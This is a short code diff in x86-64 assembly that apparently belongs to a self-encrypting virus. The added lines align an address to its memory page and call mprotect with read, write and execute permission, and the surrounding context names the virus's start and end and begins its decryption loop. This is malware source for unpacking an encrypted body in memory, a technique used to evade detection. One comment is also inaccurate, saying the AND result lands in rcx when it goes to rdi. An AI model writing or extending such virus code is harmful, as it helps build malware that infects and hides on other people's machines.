@@ -45,12 +45,31 @@ mov rdx, 0x7
 ; read+write+exec = 0x7
 call mprotect
 
+call getpagesize
+; rax has 0x1000
+mov rcx, rax
+; save rax for later use when passing to mprotect
+sub	rcx, 0x1
+not rcx
+mov	rdi, %2
+and rdi, rcx
+; AND them and the result will be stored in rcx
+; rdi must hold the page_start address
+mov rsi, rax
+; rsi must have the page length
+mov rdx, 0x7
+; read+write+exec = 0x7
+call mprotect
+
+
 ; source - destination registers hold the start and end of virus
 ; there is automatic calculation happening here which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
 mov rsi, %1
 mov rdi, %2
 sub rdi, rsi
 lea rdi, [rsi+rdi]
+
+
 
 .decryption_loop:
 	; load first 16bytes of memory data to registers
